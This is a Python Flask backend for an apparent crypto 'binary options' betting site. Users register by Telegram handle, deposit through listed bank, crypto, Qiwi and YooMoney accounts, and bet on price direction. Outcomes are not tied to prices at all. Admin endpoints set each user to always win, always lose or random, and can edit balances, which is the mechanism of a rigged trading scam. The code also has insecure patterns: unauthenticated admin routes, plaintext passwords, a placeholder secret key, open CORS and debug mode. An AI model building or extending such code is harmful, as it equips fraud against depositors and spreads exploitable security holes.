from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import sqlite3
import os
import random
import threading
import time
from datetime import datetime, timedelta

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*")

# Initialize database
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # Users table with admin settings
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  telegram_username TEXT UNIQUE,
                  email TEXT,
                  password TEXT,
                  balance REAL DEFAULT 0.0,
                  bet_outcome TEXT DEFAULT 'random',
                  win_multiplier REAL DEFAULT 1.8,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Bets table with more details
    c.execute('''CREATE TABLE IF NOT EXISTS bets
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  symbol TEXT,
                  amount REAL,
                  direction TEXT,
                  time_minutes INTEGER,
                  status TEXT DEFAULT 'active',
                  result TEXT,
                  reward REAL DEFAULT 0.0,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                  completed_at DATETIME,
                  FOREIGN KEY (user_id) REFERENCES users(id))''')
    
    # Payment methods table
    c.execute('''CREATE TABLE IF NOT EXISTS payment_methods
                 (id TEXT PRIMARY KEY,
                  name TEXT,
                  details TEXT,
                  enabled INTEGER DEFAULT 1)''')
    
    conn.commit()
    
    # Add default payment methods if not exist
    c.execute("SELECT COUNT(*) FROM payment_methods")
    if c.fetchone()[0] == 0:
        default_methods = [
            ('bank', 'Банковский перевод', 'Номер счета: 40817810099910203040\nБИК: 044525225\nПАО Сбербанк', 1),
            ('crypto', 'Криптовалюта', 'BTC: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\nETH: 0x742d35Cc6634C0532925a3b8D91D0a6b3b3b3b3b', 1),
            ('qiwi', 'Qiwi', '+7 (999) 123-45-67', 1),
            ('yoomoney', 'YooMoney', '410011234567890', 1)
        ]
        c.executemany("INSERT INTO payment_methods (id, name, details, enabled) VALUES (?, ?, ?, ?)", default_methods)
        conn.commit()
    
    conn.close()

# Get user balance
def get_user_balance(telegram_username):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE telegram_username = ?", (telegram_username,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0.0

# Update user balance
def update_user_balance(telegram_username, amount):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE telegram_username = ?", (amount, telegram_username))
    conn.commit()
    conn.close()
    
    # Emit balance update via WebSocket
    socketio.emit('balance_update', {
        'telegram_username': telegram_username,
        'balance': get_user_balance(telegram_username)
    })

# Register new user
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    telegram_username = data.get('telegram')
    email = data.get('email')
    password = data.get('password')
    
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (telegram_username, email, password, balance) VALUES (?, ?, ?, ?)",
                  (telegram_username, email, password, 0.0))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'User registered successfully',
            'balance': 0.0
        })
    except sqlite3.IntegrityError:
        return jsonify({
            'success': False,
            'message': 'Telegram username already exists'
        }), 400
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Login user
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    telegram_username = data.get('telegram')
    password = data.get('password')
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE telegram_username = ? AND password = ?", 
              (telegram_username, password))
    user = c.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'success': True,
            'telegram': telegram_username,
            'balance': user[4]  # balance is the 5th column
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Invalid credentials'
        }), 401

# Get user balance
@app.route('/api/balance/<telegram_username>', methods=['GET'])
def get_balance(telegram_username):
    balance = get_user_balance(telegram_username)
    return jsonify({
        'telegram_username': telegram_username,
        'balance': balance
    })

# Place a bet
@app.route('/api/bet', methods=['POST'])
def place_bet():
    data = request.get_json()
    telegram_username = data.get('telegram')
    symbol = data.get('symbol', 'BTCUSDT')
    amount = float(data.get('amount'))
    direction = data.get('direction')
    time_minutes = int(data.get('time'))
    
    # Check if user has sufficient balance
    current_balance = get_user_balance(telegram_username)
    if current_balance < amount:
        return jsonify({
            'success': False,
            'message': 'Insufficient balance'
        }), 400
    
    # Deduct bet amount from user balance
    update_user_balance(telegram_username, -amount)
    
    # Save bet to database
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE telegram_username = ?", (telegram_username,))
    user_result = c.fetchone()
    if not user_result:
        conn.close()
        return jsonify({
            'success': False,
            'message': 'User not found'
        }), 404
    
    user_id = user_result[0]
    
    c.execute("INSERT INTO bets (user_id, symbol, amount, direction, time_minutes, status) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, symbol, amount, direction, time_minutes, 'active'))
    bet_id = c.lastrowid
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'message': 'Bet placed successfully',
        'bet_id': bet_id,
        'new_balance': get_user_balance(telegram_username)
    })

# WebSocket connection
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

# WebSocket event for balance updates
@socketio.on('request_balance')
def handle_balance_request(data):
    telegram_username = data.get('telegram_username')
    balance = get_user_balance(telegram_username)
    emit('balance_update', {
        'telegram_username': telegram_username,
        'balance': balance
    })

# Complete bet endpoint - called when trade timer expires
@app.route('/api/complete-bet', methods=['POST'])
def complete_bet():
    data = request.get_json()
    telegram_username = data.get('telegram')
    symbol = data.get('symbol')
    direction = data.get('direction')
    amount = float(data.get('amount'))
    time_minutes = int(data.get('time'))
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # Get user settings
    c.execute("SELECT id, bet_outcome, win_multiplier FROM users WHERE telegram_username = ?", (telegram_username,))
    user_result = c.fetchone()
    if not user_result:
        conn.close()
        return jsonify({
            'success': False,
            'message': 'User not found'
        }), 404
    
    user_id, bet_outcome, win_multiplier = user_result
    
    # Determine result based on admin settings
    if bet_outcome == 'win':
        won = True
    elif bet_outcome == 'lose':
        won = False
    else:  # random
        won = random.choice([True, False])
    
    reward = 0
    result = 'loss'
    
    if won:
        # Calculate reward: original amount + profit
        profit = amount * win_multiplier
        reward = amount + profit  # Return bet + winnings
        result = 'win'
        
        # Update user balance
        c.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (reward, user_id))
    
    # Update bet status in database
    c.execute("""UPDATE bets SET status = 'completed', result = ?, reward = ?, completed_at = CURRENT_TIMESTAMP
                 WHERE user_id = ? AND status = 'active' 
                 ORDER BY timestamp DESC LIMIT 1""",
              (result, reward, user_id))
    
    conn.commit()
    
    # Get new balance
    c.execute("SELECT balance FROM users WHERE id = ?", (user_id,))
    new_balance = c.fetchone()[0]
    
    conn.close()
    
    # Emit balance update via WebSocket
    socketio.emit('balance_update', {
        'telegram_username': telegram_username,
        'balance': new_balance
    })
    
    return jsonify({
        'success': True,
        'result': result,
        'reward': reward,
        'new_balance': new_balance
    })

# Admin endpoints
@app.route('/api/admin/users', methods=['GET'])
def get_all_users():
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("""SELECT id, telegram_username, email, balance, bet_outcome, win_multiplier, created_at 
                     FROM users ORDER BY id DESC""")
        users = c.fetchall()
        conn.close()
        
        users_list = []
        for user in users:
            users_list.append({
                'id': user[0],
                'telegram_username': user[1],
                'email': user[2],
                'balance': user[3],
                'bet_outcome': user[4],
                'win_multiplier': user[5],
                'created_at': user[6]
            })
        
        return jsonify({
            'success': True,
            'users': users_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/admin/user/<int:user_id>', methods=['GET'])
def get_user_details(user_id):
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("""SELECT id, telegram_username, email, balance, bet_outcome, win_multiplier, created_at 
                     FROM users WHERE id = ?""", (user_id,))
        user = c.fetchone()
        conn.close()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        return jsonify({
            'success': True,
            'user': {
                'id': user[0],
                'telegram_username': user[1],
                'email': user[2],
                'balance': user[3],
                'bet_outcome': user[4],
                'win_multiplier': user[5],
                'created_at': user[6]
            }
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/admin/user/<int:user_id>/balance', methods=['POST'])
def update_user_balance_admin(user_id):
    try:
        data = request.get_json()
        amount = float(data.get('amount'))
        reason = data.get('reason', 'manual')
        
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        
        # Update balance
        c.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))
        
        # Get new balance and username
        c.execute("SELECT balance, telegram_username FROM users WHERE id = ?", (user_id,))
        result = c.fetchone()
        
        conn.commit()
        conn.close()
        
        if not result:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        new_balance, telegram_username = result
        
        # Emit balance update via WebSocket
        socketio.emit('balance_update', {
            'telegram_username': telegram_username,
            'balance': new_balance
        })
        
        return jsonify({
            'success': True,
            'new_balance': new_balance
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/admin/user/<int:user_id>/settings', methods=['POST'])
def update_user_settings(user_id):
    try:
        data = request.get_json()
        bet_outcome = data.get('bet_outcome', 'random')
        win_multiplier = float(data.get('win_multiplier', 1.8))
        
        # Validate inputs
        if bet_outcome not in ['random', 'win', 'lose']:
            return jsonify({
                'success': False,
                'message': 'Invalid bet_outcome value'
            }), 400
        
        if win_multiplier <= 0:
            return jsonify({
                'success': False,
                'message': 'win_multiplier must be positive'
            }), 400
        
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("UPDATE users SET bet_outcome = ?, win_multiplier = ? WHERE id = ?",
                  (bet_outcome, win_multiplier, user_id))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Payment methods endpoints
@app.route('/api/payment-methods', methods=['GET'])
def get_payment_methods():
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("SELECT id, name FROM payment_methods WHERE enabled = 1")
        methods = c.fetchall()
        conn.close()
        
        methods_list = [{'id': m[0], 'name': m[1]} for m in methods]
        
        return jsonify({
            'success': True,
            'methods': methods_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/payment-methods/<method_id>', methods=['GET'])
def get_payment_method_details(method_id):
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("SELECT id, name, details FROM payment_methods WHERE id = ? AND enabled = 1", (method_id,))
        method = c.fetchone()
        conn.close()
        
        if not method:
            return jsonify({
                'success': False,
                'message': 'Payment method not found'
            }), 404
        
        return jsonify({
            'success': True,
            'method': {
                'id': method[0],
                'name': method[1],
                'details': method[2]
            }
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Background thread is not needed anymore - bets are resolved by frontend timer

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='localhost', port=5000, debug=True)